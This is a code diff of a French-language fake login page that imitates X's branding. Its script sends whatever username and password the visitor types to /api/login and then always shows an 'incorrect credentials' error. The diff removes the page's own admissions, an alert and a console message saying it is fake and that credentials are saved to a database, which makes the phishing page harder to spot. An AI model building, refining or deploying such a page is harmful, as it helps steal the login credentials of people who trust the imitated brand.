@@ -7,7 +7,7 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background-color: #000000;
+            background: #000;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
@@ -16,24 +16,20 @@
             padding: 20px;
         }
         .login-container {
-            background-color: #121212;
+            background: #121212;
             border-radius: 32px;
             padding: 40px 32px;
             width: 100%;
             max-width: 420px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.8);
             border: 1px solid #2f3336;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.8);
         }
         .x-logo {
             display: flex;
             justify-content: center;
             margin-bottom: 32px;
         }
-        .x-logo svg {
-            width: 40px;
-            height: 40px;
-            fill: #ffffff;
-        }
+        .x-logo svg { width: 40px; height: 40px; fill: #fff; }
         .login-title {
             color: #e7e9ea;
             font-size: 28px;
@@ -47,9 +43,7 @@
             text-align: center;
             margin-bottom: 32px;
         }
-        .form-group {
-            margin-bottom: 16px;
-        }
+        .form-group { margin-bottom: 16px; }
         .form-group label {
             display: block;
             color: #71767b;
@@ -60,13 +54,12 @@
         .form-group input {
             width: 100%;
             padding: 14px 16px;
-            background-color: #000000;
+            background: #000;
             border: 1px solid #2f3336;
             border-radius: 8px;
             color: #e7e9ea;
             font-size: 16px;
             outline: none;
-            transition: border-color 0.2s;
         }
         .form-group input:focus {
             border-color: #1d9bf0;
@@ -75,35 +68,29 @@
         .login-btn {
             width: 100%;
             padding: 14px;
-            background-color: #1d9bf0;
+            background: #1d9bf0;
             border: none;
             border-radius: 40px;
-            color: #ffffff;
+            color: #fff;
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            transition: background-color 0.15s;
             margin-top: 12px;
+            transition: background 0.15s;
         }
-        .login-btn:hover { background-color: #1a8cd8; }
+        .login-btn:hover { background: #1a8cd8; }
         .login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .error-message {
-            background-color: rgba(244, 33, 46, 0.1);
-            border: 1px solid rgba(244, 33, 46, 0.3);
+            background: rgba(244,33,46,0.1);
+            border: 1px solid rgba(244,33,46,0.3);
             color: #f4212e;
             padding: 12px 16px;
             border-radius: 8px;
-            font-size: 14px;
             text-align: center;
             margin-bottom: 16px;
             display: none;
         }
-        .error-message.show { display: block; animation: shake 0.3s; }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-8px); }
-            75% { transform: translateX(8px); }
-        }
+        .error-message.show { display: block; }
         .login-footer {
             margin-top: 40px;
             text-align: center;
@@ -112,39 +99,32 @@
         }
         .login-footer p { color: #71767b; font-size: 14px; }
         .login-footer a { color: #1d9bf0; text-decoration: none; font-weight: 600; }
-        .login-footer a:hover { text-decoration: underline; }
         .spinner {
             display: inline-block;
             width: 20px;
             height: 20px;
             border: 2px solid rgba(255,255,255,0.3);
             border-radius: 50%;
-            border-top-color: #ffffff;
+            border-top-color: #fff;
             animation: spin 0.8s linear infinite;
             vertical-align: middle;
             margin-right: 8px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        @media (max-width: 480px) {
-            .login-container { padding: 24px 16px; border-radius: 24px; }
-            .login-title { font-size: 24px; }
-        }
     </style>
 </head>
 <body>
 <div class="login-container">
     <div class="x-logo">
-        <svg viewBox="0 0 24 24" aria-hidden="true">
-            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
-        </svg>
+        <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
     </div>
     <h1 class="login-title">Connexion</h1>
     <p class="login-subtitle">Connectez-vous à votre compte</p>
-    
+
     <div id="error-message" class="error-message">
-        <span id="error-text">⚠️ Identifiants incorrects. Veuillez réessayer.</span>
+        ⚠️ Identifiants incorrects. Veuillez réessayer.
     </div>
-    
+
     <form id="login-form">
         <div class="form-group">
             <label for="username">Nom d'utilisateur</label>
@@ -156,75 +136,52 @@
         </div>
         <button type="submit" class="login-btn" id="login-btn">Se connecter</button>
     </form>
-    
+
     <div class="login-footer">
         <p>Pas encore de compte ? <a href="#">S'inscrire</a></p>
-        <p style="margin-top: 8px; font-size: 12px; color: #54585d;">&copy; 2026 X Corp.</p>
+        <p style="margin-top:8px;font-size:12px;color:#54585d;">&copy; 2026 X Corp.</p>
     </div>
 </div>
 
 <script>
     const form = document.getElementById('login-form');
-    const errorMessage = document.getElementById('error-message');
-    const errorText = document.getElementById('error-text');
+    const errorMsg = document.getElementById('error-message');
     const loginBtn = document.getElementById('login-btn');
-
-    const errorMessages = [
-        '❌ Identifiants incorrects. Veuillez réessayer.',
-        '⚠️ Le nom d\'utilisateur ou le mot de passe est incorrect.',
-        '🔒 Identifiants invalides. Vérifiez vos informations.'
-    ];
-
-    function showRandomError() {
-        const randomIndex = Math.floor(Math.random() * errorMessages.length);
-        errorText.textContent = errorMessages[randomIndex];
-        errorMessage.classList.add('show');
-    }
 
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
         loginBtn.disabled = true;
         loginBtn.innerHTML = '<span class="spinner"></span> Connexion...';
-        errorMessage.classList.remove('show');
+        errorMsg.classList.remove('show');
 
         const username = document.getElementById('username').value.trim();
         const password = document.getElementById('password').value.trim();
 
         if (!username || !password) {
-            errorText.textContent = '⚠️ Veuillez remplir tous les champs.';
-            errorMessage.classList.add('show');
+            errorMsg.textContent = '⚠️ Veuillez remplir tous les champs.';
+            errorMsg.classList.add('show');
             loginBtn.disabled = false;
             loginBtn.innerHTML = 'Se connecter';
             return;
         }
 
         try {
-            const response = await fetch('/api/login', {
+            await fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ username, password })
             });
 
-            showRandomError();
-
+            errorMsg.textContent = '⚠️ Identifiants incorrects. Veuillez réessayer.';
+            errorMsg.classList.add('show');
         } catch (error) {
-            console.error('Erreur:', error);
-            errorText.textContent = '❌ Erreur réseau. Vérifiez votre connexion.';
-            errorMessage.classList.add('show');
+            errorMsg.textContent = '❌ Erreur réseau. Vérifiez votre connexion.';
+            errorMsg.classList.add('show');
         }
 
         loginBtn.disabled = false;
         loginBtn.innerHTML = 'Se connecter';
     });
-
-    document.querySelectorAll('.login-footer a').forEach(link => {
-        link.addEventListener('click', (e) => {
-            e.preventDefault();
-            alert('😄 Ceci est une page de connexion factice. Vos identifiants ont été enregistrés.');
-        });
-    });
-
-    console.log('🔐 Fausse page X active - Les identifiants sont enregistrés dans la BDD');
 </script>
 </body>
 </html>
